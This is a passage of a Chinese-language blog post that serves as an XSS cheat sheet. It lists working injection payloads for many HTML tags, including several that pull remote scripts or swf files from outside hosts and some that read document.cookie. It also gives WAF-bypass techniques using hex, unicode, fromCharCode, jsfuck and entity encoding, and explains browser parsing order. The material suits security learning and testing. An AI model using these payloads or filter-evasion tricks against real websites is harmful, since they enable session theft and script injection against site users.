+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">SRC</span>=<span class="string">&quot;http://0x.lv/xss.swf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>meta标签<br>测试时发现昵称，文章标题跑到meta标签中，那么只需要跳出当前属性再添加<code>http-equiv=&quot;refresh&quot;</code>，就可以构造一个有效地xss payload。还有一些猥琐的思路，就是通过给<code>http-equiv</code>设置<code>set-cookie</code>，进一步重新设置cookie来干一些猥琐的事情。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;javascript<span class="symbol">&amp;colon;</span>alert(1)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>object标签<br>和a标签的href属性的玩法是一样的，优点是无需交互。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4</span>=&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>marquee标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">&quot;alert(&#x27;1&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>isindex标签<br>在一些只针对属性做了过滤的webapp中，action很有可能是漏网之鱼。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>input标签<br>通过event来调用js。和button一样通过autofocus可以达到无需交互即可弹窗的效果。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>select标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>textarea标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>keygen标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>frameset标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span> </span><br></pre></td></tr></table></figure></li>
+<li><p>embed标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span> //chrome </span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span> //firefox</span><br></pre></td></tr></table></figure></li>
+<li><p>svg标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">g</span> <span class="attr">onload</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">g</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>  //chrome有效</span><br></pre></td></tr></table></figure></li>
+<li><p>math标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">href</span>=<span class="string">&quot;javascript:javascript:alert(1)&quot;</span>&gt;</span>CLICKME<span class="tag">&lt;/<span class="name">math</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">y</span>/<span class="attr">xlink:href</span>=<span class="string">javascript:alert(51)</span>&gt;</span>test1 </span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span> <span class="tag">&lt;<span class="name">maction</span> <span class="attr">actiontype</span>=<span class="string">&quot;statusline#http://wangnima.com&quot;</span> <span class="attr">xlink:href</span>=<span class="string">&quot;javascript:alert(49)&quot;</span>&gt;</span>CLICKME </span><br></pre></td></tr></table></figure></li>
+<li><p>video标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(48)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>audio标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(47)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>background属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> // 在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>poster属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">poster</span>=<span class="string">javascript:alert(1)//</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // Opera 10.5以下有效</span><br></pre></td></tr></table></figure></li>
+<li><p>code属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">code</span>=<span class="string">&quot;javascript:confirm(document.cookie);&quot;</span>&gt;</span> // Firefox有效</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>expression属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;xss:expression(alert(0))&quot;</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;<span class="symbol">&amp;#0;</span>x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-id">#test</span>&#123;<span class="attribute">x</span>:<span class="built_in">expression</span>(alert(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> // IE7以下</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h2 id="0x02-一些过waf技巧"><a href="#0x02-一些过waf技巧" class="headerlink" title="0x02 一些过waf技巧"></a>0x02 一些过waf技巧</h2><ul>
+<li>单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过<code>&lt;scr&lt;script&gt;ipt&gt;</code></li>
+<li>大小写绕过：<code>&lt;sCript&gt;</code></li>
+<li>alert被过滤，可以尝试prompt和confirm</li>
+<li>没有引号和分号：<code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code></li>
+<li>空格被过滤：<code>&lt;img/src=&quot;&quot;onerror=alert(2)&gt; &lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code></li>
+<li>反引号妙用：</li>
+<li>长度限制时： <code>&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效</code></li>
+<li>单引号及双引号被过滤情况: <code>&lt;script&gt;alert(/jdq/)&lt;/script&gt; //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显</code></li>
+<li>javascript伪协议<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(/test/)&quot;</span>&gt;xss&lt;/a&gt;</span><br><span class="line"> &lt;iframe src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>);height=<span class="number">0</span> width=<span class="number">0</span> /&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>利用iframe框架标签</span></span><br></pre></td></tr></table></figure></li>
+<li>畸形payload：<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></li>
+<li>/的妙用：<code>&lt;script&gt;alert(/3/)&lt;/script&gt;</code></li>
+<li>括号被过滤,可以使用throw来抛出数据<br><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;2&lt;/a&gt;</code><br><code>&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</code><br>以上两个测试向量在 Chrome 和 IE 上会出现一个 “uncaught” 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）<br><code>&lt;body/onload=javascript:window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&gt;</code></li>
+<li>当=();:被过滤时:<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code>opera 中可以不闭合 <code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41</code> // Opera可查</li>
+<li>过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用<code>&lt;iframe src=&quot;javascript:alert(1253)&quot; height=0 width=0 /&gt;&lt;iframe&gt;</code>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; 拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点<code>&lt;scri&lt;!-- 第二处--&gt;pt&gt;</code>;</li>
+<li>无法使用href:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover&#x3D;&quot;alert(document.cookie)&quot;&gt;xxs link&lt;&#x2F;a&gt;</span><br><span class="line">在chrome下，其回补全缺失的引号。因此，也可以这样写：</span><br><span class="line">&lt;a onmouseover&#x3D;alert(document.cookie)&gt;xxs link&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>解决限制字符(要求同页面)<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=’<span class="built_in">document</span>.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’tp:<span class="comment">//ww’&lt;/script&gt;</span></span><br><span class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’.net/<span class="number">1.</span>’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’js&gt;&lt;<span class="regexp">/sc’&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+​</li>
+<li>编码：<ul>
+<li>JS函数（如eval，settimeout）还有就是<code>href= action= formaction= location= on*= name= background= poster= src= code=</code>这些地方，可以配合编码。此外，data属性可以base64编码。<ol>
+<li>js16进制<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(“js+<span class="number">16</span>进制加密”)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;</span>)&lt;/script&gt;</span><br><span class="line">编码要执行的语句↓</span><br><span class="line">Alert(“xss”)</span><br></pre></td></tr></table></figure></li>
+<li>js unicode<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">&quot;unicode加密&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">//js unicode加密 解决alert()被过滤</span></span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>String.fromCharCode函数（不需要任何引号，必须函数内）<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode编码内容))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">13</span>))&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>jsfuck版本<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>HTML编码： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;1&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;aler<span class="symbol">&amp;#x0074;</span>(1)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>base64编码（仅data支持）  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">格式：</span><br><span class="line">Data:<span class="tag">&lt;<span class="name">mime</span> <span class="attr">type</span>&gt;</span>,<span class="tag">&lt;<span class="name">encoded</span> <span class="attr">data</span>&gt;</span></span><br><span class="line">Data //协议</span><br><span class="line"><span class="tag">&lt;<span class="name">mime</span> <span class="attr">type</span>&gt;</span> //数据类型</span><br><span class="line">charset=<span class="tag">&lt;<span class="name">charset</span>&gt;</span>  //指定编码</span><br><span class="line">[;base64] //被指定的编码</span><br><span class="line"><span class="tag">&lt;<span class="name">encoded</span> <span class="attr">data</span>&gt;</span> //定义data协议的编码</span><br><span class="line">特点：不支持IE</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>存在json数据解析 context： <code>&lt;?=json_encode($_GET[&#39;x&#39;])?&gt;</code> payload： <code>?x=&lt;img+src=x+onerror=ö-alert(1)&gt;</code></li>
+<li>SVG 标签<br>当返回结果在 svg 标签中的时候，会有一个特性 <code>&lt;svg&gt;&lt;script&gt;varmyvar=&quot;YourInput&quot;;&lt;/script&gt;&lt;/svg&gt;</code> YourInput 可控，输入 <code>www.site.com/test.php?var=text&quot;;alert(1)//</code> 如果把 “ 编码一些他仍然能够执行: <code>&lt;svg&gt;&lt;script&gt;varmyvar=&quot;text&amp;quot;;alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;</code><br>​<br>​<h2 id="0x03-其它知识"><a href="#0x03-其它知识" class="headerlink" title="0x03  其它知识"></a>0x03  其它知识</h2><h3 id="浏览器解析规则"><a href="#浏览器解析规则" class="headerlink" title="浏览器解析规则"></a>浏览器解析规则</h3></li>
+</ul>
+<p><strong>URL编码：</strong></p>
+<p>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)</p>
+<p><strong>HTML实体编码：</strong></p>
+<ul>
+<li>命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&lt;”</li>
+<li>字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&#060;”和“&#x3c;”</li>
+</ul>
+<p><strong>JS编码：</strong>js提供了四种字符编码的策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”</span><br><span class="line">2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”</span><br><span class="line">3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”</span><br><span class="line">4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</span><br><span class="line">5、jsfuck编码</span><br></pre></td></tr></table></figure>
+<p><strong>CSS编码：</strong>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”</p>
+<p>HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码</p>
+<p>浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。</p>
+<p>比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:window.open(&#x27;http://www.baidu.com&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码，HTML解析器首先工作（注：此时，若href=”字符串”中的字符串存在字符引用，会对其解码）。然后URL解析器开始对href值进行URL解析。进行URL解析时，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。即，javascript:是不能进行任何js编码的。解析了javascript：之后，会由JS解析器进行解析。JS解析器针对一些编码，其只有在标志符名称里的编码字符才能够被正常的解析。解析完window.open以后，又会由URL解析器进行解析。想了解各解析器的特性，可参考这篇文章<a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/292.html">深入理解浏览器解析机制和XSS向量编码</a></p>
+<p>JS解析器不会解析和解码字符引用，而针对JS的一些编码其会视情况而定。</p>
+<p>可以看到，该代码经过了HTML-&gt;URL-&gt;JS-&gt;URL 四重解析。由于不同的解析器能够分别对一些编码格式进行解析，所以我们可以通过生成特定格式的编码代码，令其在依次解码后能够正确执行，从而绕过WAF。</p>
+<p>如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该代码能够正确执行。</p>
+<p>首先，经过HTML解析之后，代码会变成</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时，由于javascript已经生成，不违反URL解析规则。所以，URL解析正常。解析了javascript，最终进入JS解析器。注意，URL解析器还完成了URL解码工作。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(2)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以，JS最终解析的代码时alert(2).成功执行。</p>
+<p>总结来说，各种编码在XSS中的利用非常灵活，我们需要在充分了解浏览器的解析原理合理构造合理编码顺序的代码，最终构造出Payload。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/10/19/Git%E6%B3%84%E9%9C%B2/">
+                    Git泄露
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/">
+                    sqli-labs-通关writeup 1-10
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">0x00 渗透流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%85%B7%E4%BD%93%E6%A0%87%E7%AD%BE%E7%9A%84Payload"><span class="toc-number">2.</span> <span class="toc-text">0x01 具体标签的Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%80%E4%BA%9B%E8%BF%87waf%E6%8A%80%E5%B7%A7"><span class="toc-number">3.</span> <span class="toc-text">0x02 一些过waf技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%85%B6%E5%AE%83%E7%9F%A5%E8%AF%86"><span class="toc-number">4.</span> <span class="toc-text">0x03  其它知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99"><span class="toc-number">4.1.</span> <span class="toc-text">浏览器解析规则</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/10/19/Git%E6%B3%84%E9%9C%B2/" title="上一篇: Git泄露">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
